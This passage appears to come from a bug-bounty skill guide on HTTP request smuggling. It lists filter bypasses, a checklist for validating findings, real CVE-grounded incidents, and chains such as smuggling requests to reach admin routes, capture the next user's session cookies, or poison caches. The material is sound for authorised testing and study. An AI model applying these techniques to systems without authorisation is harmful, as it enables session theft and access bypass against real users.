The same masking works on `Content-Length`: `Content-Length : 0` is the obfuscated form PortSwigger's own 0.CL exploit script uses, and hiding a `Content-Length` from the back-end but not the front-end is itself a CL.0 vector. Obsolete line folding is also exactly what CVE-2025-32094 turned on.

Other bypasses, in rough order of how often they still work in 2026:

- **Move the ambiguity into HTTP/2.** A front-end that strips `transfer-encoding` from the header section may still copy a CRLF out of a header *value* into the downgraded request.
- **Attack the header name, not the value.** Filters are written for values.
- **Attack pseudo-headers.** Frequently unfiltered even where ordinary headers are sanitised.
- **Use a bare `\n` where `\r\n` is blocked.** A fix that only matches the full CRLF sequence leaves this open.
- **Split in the headers rather than the body** so the method no longer has to allow a body.
- **Smuggle through a trailer** to reintroduce a header the edge stripped.
- **Request tunnelling** where the front-end never reuses upstream connections: your smuggled request still reaches the back-end without passing front-end rules, even though it can never touch another user. Confirm it by finding HTTP/1 response text inside an HTTP/2 response body, and switch the outer request to `HEAD` to make the second response readable — `OPTIONS`, `POST` or `GET` sometimes work where `HEAD` does not. Use `Param Miner` to guess the internal header names the front-end injects.
- **Chain a V-H or H-V masked-header discrepancy into a 0.CL desync** when direct CL/TE confusion is dead.

---

## Gate 0 Validation

Run every one of these before the word "smuggling" appears in a report.

1. **Did you disable connection reuse?** If the PoC dies without it, you are probably looking at your own pipelining. Only connection-locked smuggling, connection-state attacks and client-side desync legitimately need reuse — name which one and prove it on its own terms.
2. **Did the effect land on a request you did not send?** For server-side desync, the setup request and the observation request must travel on **different connections**. Your own follow-up on your own socket proves nothing. The single-connection CL.0 probe is the exception only in the narrow sense that it is a *detection* result and never an impact result — and it is Stage B regardless, because the prefix lands upstream whatever your own client does.
3. **Does the timing differential survive repetition?** 3/3 against a 5-sample baseline, per the confirmation gate. 1/3 is weather.
4. **Is the response actually attributable to your prefix?** The follow-up must return the response for the path you smuggled, not merely a different status. A WAF block page, a generic 400 and a maintenance page all look like "something changed".
5. **Did you rule out the mundane?** `Connection: close` on the front-end, an upstream timeout, an idle-connection reaper, a 100-request keep-alive limit and an autoscaling event all produce desync-shaped artefacts.
6. **Did you check whether the front-end is RFC-strict first?** A 400 on `CL`+`TE` is the correct behaviour, not a finding.
7. **Is your `Content-Length` arithmetic right?** `printf '...' | wc -c`. An off-by-one changes which attack you actually sent.
8. **Did you confirm the target returned to normal?** Clean client, new connection, affected paths, recorded result.
9. **Is the impact you are claiming the impact you demonstrated?** "Parser disagreement observed" and "another user's session token captured" are two findings several orders of magnitude apart, and the second one needs Stage B sign-off you must be able to cite.

---

## Real Impact Examples

Research-grounded cases, each traceable to the linked primary source. The recurring lesson: one edge bug is a bug in every tenant behind that edge.

| Target | Variant | Grounding |
|---|---|---|
| Netflix (Zuul/Netty) | H2.CL — downgrade honoured an attacker `content-length` | CVE-2021-21295 |
| AWS Application Load Balancer | H2.TE — ALB accepted `transfer-encoding` in HTTP/2 requests, so every site behind it inherited the desync | Amazon patched; Desync Guardian ships; PortSwigger's 2025 work found ALB+IIS still exploitable, no CVE assigned |
| Imperva Cloud WAF | H2.TE **and** H2.X request splitting — every customer site | 2021 H2 research |
| Netlify CDN | H2.TE via CRLF in a header value; `:scheme` URL-prefix injection → path override and cache poisoning | 2021 H2 research |
| Atlassian Jira behind PulseSecure vTM | H2.X splitting via double CRLF → cross-user response leakage, persistent session breakage; hotfix 1 bypassed via header *names*, hotfix 2 via pseudo-headers and a bare `\n` | 2021 H2 research |
| F5 BIG-IP | request splitting; and the 2019 CL.TE weakness behind the New Relic finding | advisories K97045220, K50375550 |
| Apache `mod_proxy` | request-line injection via spaces in `:method`, bypassing `ProxyMatch` deny rules | CVE-2021-33193 |
| Apache Traffic Server | chunked trailer forwarding → smuggling, possible cache poisoning | CVE-2024-35161 |
| Akamai | CL.0 via `OPTIONS` + `Expect: 100-continue` + obsolete line folding, read differently by two in-path Akamai servers; also the 2019 masked-`Transfer-Encoding` case | CVE-2025-32094 |
| T-Mobile, GitLab | 0.CL (GitLab via obfuscated `Expect`) — exploitable once an early-response gadget is in hand | 2025 research |
| Bitbucket | blind request tunnelling, internal-header leakage, cache poisoning via `HEAD` | 2021 H2 research |
| Cisco and Pulse Secure web VPNs | client-side desync — the victim's own browser poisons its connection, no proxy chain needed | 2022 browser-powered research |

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`hunt-xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect has to land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.
- **`hunt-host-header`** — Owns what you *do* with a Host you control; this skill owns getting it past the hop that would have rejected it. Chain primitive: a connection-state attack (first-request validation or first-request routing) sends an allowed `Host` on request 1, then an internal or attacker-chosen `Host` on request 2 over the same connection → the front-end never re-checks → hand the resulting Host-controlled request to `hunt-host-header` for password-reset-link poisoning, routing SSRF or OAuth issuer abuse. Connection contamination is the browser-delivered form of the same primitive.
- **`hunt-cache-poison`** (second chain) — Request *tunnelling* reaches the cache without touching another user's request: switch the outer request to `HEAD` so the front-end over-reads and serves the smuggled response, which the cache stores. Use it where the front-end does not reuse upstream connections, so the classic desync chain is impossible. Response splitting (CWE-113) feeds the same sink from a parameter. Cache-poisoning confirmation is Stage B and needs a cachebuster.
- **`hunt-tls-network`** — Supplies the preconditions this class reads: ALPN negotiation (does the edge offer `h2`, is there an undisclosed h2 listener behind `--http2-prior-knowledge`), and the certificate SAN list plus resolved addresses that decide whether browser connection coalescing — and therefore connection contamination — is possible at all.


